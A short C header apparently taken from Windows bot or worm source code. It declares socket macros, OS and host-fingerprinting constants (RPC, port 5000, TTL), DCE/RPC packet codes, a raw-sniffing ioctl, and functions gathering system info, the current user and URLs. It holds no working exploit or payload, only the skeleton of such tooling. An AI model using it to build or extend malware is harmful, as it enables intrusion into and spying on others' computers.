

#include "Include.h"
#include "CThread.h"

#define xRead(x,y,z) recv(x,y,z,0)
#define xWrite(x,y,z) send(x,y,z,0)
#define xClose closesocket
#define OS_UNKNOWN			0
#define OS_WINNT			1
#define OS_WIN2K			2
#define	OS_WINXP			3

#define FP_RPC				1
#define	FP_PORT5K			2
#define FP_TTL				3
#define DCE_PKT_BINDACK		0x0C
#define DCE_PKT_RESPONSE	0x02
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)



int				FpHost(DWORD szHost, int iFpType);
char * sysinfo(char *sinfo);

int				RandomNumber(int iStart,int iEnd);

// Return a random DWORD -- rewrite: bad hack used
DWORD			RandomDword();
// Return a random BYTE -- rewrite: bad hack used
BYTE			RandomByte();
char * currentuser(char *sinfo);
char * freeResInt(char *sinfo);
char * geturl(char *sinfo);
